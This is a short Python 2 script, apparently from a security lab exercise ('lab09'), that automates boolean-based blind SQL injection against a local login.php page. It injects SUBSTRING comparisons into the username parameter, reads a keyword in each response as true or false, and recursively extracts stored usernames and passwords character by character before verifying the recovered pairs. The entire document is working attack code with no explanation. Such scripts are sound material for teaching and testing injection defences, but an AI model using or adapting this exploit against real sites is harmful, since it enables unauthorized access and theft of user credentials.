import urllib
from itertools import combinations

charList =  list(map(chr,range(33,126)))
charList.remove("+")
result = []
final_result = []

def checkUsername(username,l):
    request = urllib.urlopen("http://localhost/lab09/login.php?u=admin%22 and SUBSTRING(username,1,"+str(l)+")=%22"+str(username)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        for i in combinations(charList,1):
            char = "".join(i)
            print l,username+char
            checkUsername(username+char,l+1)
    else:
        if controlUsername(username[:(l-1)])==1 and username[:(l-1)] not in result:
            result.append(username[:(l-1)])
        return 0

def controlUsername(foundUsername):
    request = urllib.urlopen("http://localhost/lab09/login.php?u="+str(foundUsername)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        return 1
    else:
        return 0

def runUsername():
    for i in combinations(charList,1):
        name = "".join(i)
        print name
        checkUsername(name,1)
    return result

output_usernames = runUsername()

def controlPassword(username,foundPassword):
    request = urllib.urlopen("http://localhost/lab09/login.php?u="+str(username)+"&p="+str(foundPassword))
    body = request.read()
    if "cat" in body:
        return 1
    else:
        return 0

def getPassword(password,l):
    request = urllib.urlopen("http://localhost/lab09/login.php?u=admin%22 and SUBSTRING(password,1,"+str(l)+")=%22"+str(password)+"%22%20--%20")
    body = request.read()
    if "cat" in body:
        for i in combinations(charList,1):
            char = "".join(i)
            print l,password+char
            getPassword(password+char,l+1)
    else:
        for name in output_usernames:
            if controlPassword(name,password[:(l-1)])==1 and ((name,password[:(l-1)]) not in final_result):
                final_result.append((name,password[:(l-1)]))
        return 0

def runPassword():
    for i in combinations(charList,1):
        password = "".join(i)
        print password
        getPassword(password,1)
    return final_result

output = runPassword()

print output
